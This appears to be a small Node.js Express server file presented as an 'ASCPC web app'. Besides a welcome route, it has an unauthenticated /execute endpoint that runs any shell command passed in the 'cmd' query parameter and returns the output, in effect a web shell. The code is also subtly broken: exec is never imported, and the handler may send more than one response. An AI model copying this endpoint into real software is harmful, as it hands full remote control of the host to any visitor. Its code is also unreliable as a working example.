const express = require('express')
const app = express()
const port = 80

app.get("/execute", (req, res) => {
  // requested command
  const command = req.query.cmd;
  
  // execute command on system
  exec(command, (error, stdout, stderr) => {
    // handle errors
    if (error) {
      res.send(`Error executing the command: ${error}`);
    }

    if (stderr) {
      res.send(`Standard error:\n${stderr}`);
    }

    // send output of the command
    res.send(`Standard output:\n${stdout}`);
  });
});


app.get('/', (req, res) => {
  res.send('Welcome to your ASCPC web app!')
})

app.listen(port, () => {
  console.log(`Example app listening at http://localhost:${port}`)
})
